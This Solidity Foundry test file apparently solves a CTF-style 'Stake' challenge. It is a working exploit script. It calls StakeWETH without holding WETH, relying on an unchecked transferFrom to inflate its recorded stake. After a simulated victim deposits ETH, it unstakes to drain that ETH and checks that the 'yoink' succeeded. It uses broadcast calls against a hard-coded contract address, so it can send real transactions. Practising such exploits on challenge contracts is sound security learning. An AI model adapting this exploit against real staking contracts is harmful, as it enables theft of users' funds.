// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Stake} from "src/Stake/Stake.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract StakeTest is Test {
    address bob = 0x777dcCD91f7C62717DBa44db3504bDf47C75E2F1;

    function testCondition() public {
        vm.startBroadcast(bob);
        Stake target = Stake(0x0B3C437B7964c7A6161116dD29E767Ce3B464546);

        console.log(address(target).balance);
        console.log(target.totalStaked());
        console.log(target.Stakers(bob));
        console.log(target.UserStake(bob));
    }

    function testAttack() public {
        vm.startBroadcast(bob);
        Stake target = Stake(0x0B3C437B7964c7A6161116dD29E767Ce3B464546);
        IERC20 weth = IERC20(target.WETH());

        weth.approve(address(target), type(uint256).max);
        // Try to stakeWETH with transferFrom failing but stakedValue increased
        target.StakeWETH(2000000000000000);
        vm.stopBroadcast();

        // Victim stakes ETH to contract
        address alice = 0xd29e61395fCf30c4Be7914baB31bA0ed0fA14ca8;
        vm.prank(alice);
        target.StakeETH{value: 0.003 ether}();

        vm.startBroadcast(bob);

        bool success = target.Unstake(2000000000000000);
        require(success, "yoinked failed");

        if (
            !(address(target).balance > 0 &&
                target.totalStaked() > address(target).balance &&
                target.Stakers(bob) &&
                target.UserStake(bob) == 0)
        ) revert("overall yoink failed");
    }
}
